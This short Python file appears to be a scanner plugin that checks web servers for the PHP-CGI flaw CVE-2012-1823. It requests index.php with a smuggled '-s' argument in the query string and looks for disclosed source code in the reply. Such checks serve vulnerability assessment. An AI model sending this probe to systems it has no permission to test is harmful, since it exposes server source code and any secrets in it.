#coding=utf-8

import requests
import re


def run(target):
    "CVE-2012-1823"
    results = []
    url = "http://" + target + "/index.php?-s"

    try:
        r = requests.get(url, timeout=5)
    except Exception:
        pass
    else:
        r.close()
        if r.status_code == 200 and re.search("<span style=.*>&lt;?", r.text):
            results.append(url)

    return results
